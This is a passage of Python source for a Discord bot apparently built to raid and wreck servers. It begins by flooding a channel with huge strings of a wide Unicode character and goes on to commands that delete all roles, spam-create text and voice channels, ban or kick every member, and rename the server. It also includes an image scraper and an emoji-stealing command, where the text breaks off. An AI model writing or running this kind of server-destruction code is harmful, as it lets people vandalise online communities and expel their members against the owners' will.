        await ctx.send("﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
        await ctx.send("﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")


@Yuo.command()
async def rdelete(ctx):
  total_roles = ""
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass 
  embed = Embed(title="Done Deleting All Roles", color=0xaf1aff)
  await ctx.send(embed=embed)
  await ctx.message.delete()


@Yuo.command()
async def cspam(ctx,times_reapet=10,name_of_channel="default"):
  for times in range(times_reapet):
    guild = ctx.message.guild
    await guild.create_text_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {times_reapet} Channels <3")
  await ctx.message.delete()
  await ctx.send(embed=em3)


@Yuo.command()
async def vcspam(ctx,times_reapet=10,name_of_channel="default"):
  for times in range(times_reapet):
    guild = ctx.message.guild
    await guild.create_voice_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of voice channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {times_reapet} Voice Channels <3")
  await ctx.message.delete()
  await ctx.send(embed=em3)


@Yuo.command()
async def banAll(ctx):
 embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff)
 await ctx.send(embed=embed)
 await ctx.message.delete()
 print("Banned All Members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.ban()
        except:
           pass


@Yuo.command()
async def kickAll(ctx):
 embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff)
 await ctx.send(embed=embed)
 await ctx.message.delete()
 print("Kicked all members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.kick()
        except:
           pass


@Yuo.command()
async def cservername(ctx, name = None): 
  if name != None:
    await ctx.guild.edit(name=f"{name}")
    print("Changed Server Name")
    em200 = Embed(color = 0xaf1aff, title=f"Changed the server name to: ***{ctx.guild.name}***")
    em2001 = await ctx.send(embed=em200) 
    time.sleep(8)
    await em2001.delete()
  else:  
    em100 = Embed(color = 0xaf1aff, title=ctx.guild.name)
    em1001 = await ctx.send(embed=em100)
    time.sleep(8)
    await em1001.delete()


@Yuo.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
async def image(ctx, *, args):
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"Yuo_anal.png"))
        except:
            await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
    else:
        await ctx.send("Nothing found for **" + args + "**")


@Yuo.command()
async def servercount(ctx):
	await ctx.message.delete()
	await ctx.send(f'you are in `{len(bot.guilds)}` servers.')


@Yuo.command(aliases=["addemoji", "stealemote", "addemote"])
async def stealemoji(ctx):
    await ctx.message.delete()
    custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
    unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U